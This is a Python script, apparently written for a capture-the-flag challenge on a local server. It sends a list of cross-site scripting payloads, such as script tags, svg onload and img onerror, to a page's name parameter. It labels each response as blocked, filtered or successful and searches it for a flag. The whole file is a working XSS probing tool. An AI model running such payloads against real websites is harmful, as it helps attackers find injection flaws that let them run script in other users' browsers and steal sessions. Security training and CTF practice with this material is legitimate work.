import requests
import re

base_url = "http://127.0.0.1:32827/page"

# Core XSS payloads
payloads = [
    "<script>alert('XSS')</script>",
    "<svg onload=alert('XSS')>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe onload=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
]

print(f"Testing {len(payloads)} XSS payloads on {base_url}\n")

for i, payload in enumerate(payloads, 1):
    try:
        resp = requests.get(base_url, params={'name': payload}, timeout=5)
        
        has_success = "success_star.png" in resp.text
        has_error = "error_star.png" in resp.text
        has_blocked = "new_star.png" in resp.text
        
        flag = re.search(r'FLAG\{[^}]+\}', resp.text)
        
        result = "BLOCKED" if has_blocked else "FILTERED" if has_error else "SUCCESS" if has_success else "UNKNOWN"
        
        print(f"[{i}] {result}: {payload}")
        
        if has_success or flag:
            print(f"    Status: {resp.status_code} | Length: {len(resp.text)}")
            if flag:
                print(f"    [!] FLAG: {flag.group()}")
            print(f"    Response:\n{resp.text}\n")
            
    except Exception as e:
        print(f"[{i}] ERROR: {payload} - {e}")

print("\nDone")

